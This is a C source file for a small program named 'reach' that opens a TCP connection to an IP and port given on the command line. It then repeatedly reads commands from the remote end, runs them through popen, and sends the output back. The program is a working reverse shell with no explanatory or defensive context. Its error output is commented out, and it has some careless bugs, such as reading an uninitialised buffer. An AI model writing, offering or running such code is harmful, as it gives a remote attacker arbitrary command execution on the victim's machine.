#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#define ERROR -1
#define MAX 4096


void *get_in(struct sockaddr * sa)
{
	if (sa->sa_family == AF_INET)
		return &(((struct sockaddr_in *)sa)->sin_addr);

	return &(((struct sockaddr_in6 *)sa)->sin6_addr);
}

int main(int argc, char **argv)
{
	FILE *fp;
	struct addrinfo serv, *servinfo, *p;
	int sock, status, msgbytes;
	char s[INET6_ADDRSTRLEN];
	char buf[MAX];
	char wrt[MAX];
	char *cls = "close\0";
	char *gbye = "Good Bye\n\0";
	char *head = ">$ ";
	//char *cr = "\n\0";
	char *hello = "Hello\n\n\0";
	char *port = argv[2];
	char *addr = argv[1];
	socklen_t addrlen;

	if (argc < 3)
	{
		printf("Usage: reach <ip> <port>\n");
		exit(0);
	}

	memset(&serv, 0, sizeof serv);
	serv.ai_family 		= AF_UNSPEC;
	serv.ai_socktype 	= SOCK_STREAM;

	if ((status = getaddrinfo(addr, port, &serv, &servinfo)) != 0)
	{
		fprintf(stderr, "REACH: getaddrinfo(%s)\n\n", gai_strerror(status));
		exit(ERROR);
	}

	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == ERROR)
		{
			//perror("REACH: socket");
			continue;
		}
		if (connect(sock, p->ai_addr, p->ai_addrlen) == ERROR)
		{
			close(sock);
			//perror("REACH: connect");
			continue;
		}
		break;
	}
	
	
	if (p == NULL)
	{
		//fprintf(stderr,"REACH: failed to connect");
		exit(ERROR);
	}

	//printf("REACH: connecting to %s\n\n", inet_ntop(p->ai_family, get_in((struct sockaddr *)p->ai_addr), s, sizeof s));

	freeaddrinfo(servinfo);
	
	while(1 && strcmp(buf,cls) != 0)
	{
		send(sock, hello, strlen(hello), 0);


		msgbytes = 1;
		while(msgbytes && strcmp(buf,cls) != 0)
		{
			send(sock, head, strlen(head), 0);
			msgbytes = recv(sock, buf, MAX, 0);
			buf[msgbytes-1] = '\0';
			
			if (strcmp(buf,cls) == 0)
			{
				break;
			}

			if (msgbytes)
			{
				fp = popen(buf, "r");
				while (fgets(wrt, MAX, fp) != NULL)
				{
					send(sock, wrt, strlen(wrt), 0);
				}
				//strcat(buf, cr);
				//send(sock, buf, strlen(buf), 0);
			}
			
		}
		send(sock, gbye, strlen(gbye), 0);
		close(sock);
	}

	return 0;
}
